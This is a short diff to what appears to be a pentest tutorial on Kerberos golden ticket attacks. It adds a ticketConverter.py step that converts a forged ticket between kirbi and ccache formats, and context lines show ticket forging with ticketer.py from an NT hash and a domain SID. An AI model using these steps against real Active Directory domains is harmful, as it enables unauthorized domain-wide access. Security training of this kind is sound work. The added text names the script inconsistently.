@@ -70,5 +70,13 @@ sudo python3 ticketer.py -nthash 564e72d3c6c1927de1d2f252665e7c54 -domain-sid S-
 
 <img src="/img/golden/crer.PNG" alt="Getting-gz" width="800" height="150"> 
 
+Use ticket_converter.py script which will convert kirbi files into ccache file
+```
+sudo python3 ticketConverter.py admin.ccache ticket.kirbi  
+```
+
+<img src="/img/golden/convert.PNG" alt="Getting-gz" width="800" height="150"> 
+
+ whenever you want to access the Domain server service you can use the ticket.kirbi file
 
 ## golden ticket with Rubeus.exe
